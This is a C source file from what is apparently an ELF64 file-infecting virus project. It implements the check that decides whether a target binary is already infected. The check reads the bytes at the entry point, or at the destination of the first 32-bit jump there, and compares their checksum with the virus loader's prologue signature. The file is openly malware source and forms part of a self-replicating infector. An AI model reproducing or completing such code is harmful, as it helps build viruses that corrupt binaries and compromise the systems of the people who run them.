#include "virus.h"
#include "utils.h"
#include "jumps.h"
#include "errors.h"
#include "compiler_utils.h"

/*
** if current binary is already our client, don't infect again ! <3
*/
static bool	check_signature(struct safe_ptr ref, size_t offset, size_t size)
{
	const uint8_t	*signature = safe(ref, offset, size);

	if (signature == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);

	if (checksum(signature, size) == LOADER_PROLOGUE_SUM)
		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED);

	return true;
}

static bool	check_infected_jump(struct safe_ptr file_ref, size_t entry_offset)
{
	const void	*jump = find_first_jmp32(file_ref, entry_offset);

	if (jump == NULL)
		return errors(ERR_THROW, _ERR_T_NOT_INFECTED_JUMP);

	const size_t	jump_offset = jump - file_ref.ptr;
	const void	*jump_destination = get_jmp32_destination(file_ref, jump_offset);

	if (jump_destination == NULL)
		return errors(ERR_THROW, _ERR_T_NOT_INFECTED_JUMP);

	const size_t	loader_offset = jump_destination - file_ref.ptr;

	return check_signature(file_ref, loader_offset, LOADER_PROLOGUE_LEN);
}

static bool	check_infected_entry(struct safe_ptr file_ref, size_t entry_offset)
{
	return check_signature(file_ref, entry_offset, LOADER_PROLOGUE_LEN);
}

bool		not_infected(const struct entry *file_entry,
			struct safe_ptr file_ref)
{
	const Elf64_Off	sh_offset    = file_entry->safe_shdr->sh_offset;
	const size_t	entry_offset = sh_offset + file_entry->offset_in_section;

	if (!check_infected_entry(file_ref, entry_offset)
	|| !check_infected_jump(file_ref, entry_offset))
		return errors(ERR_THROW, _ERR_T_NOT_INFECTED);

	return true;
}
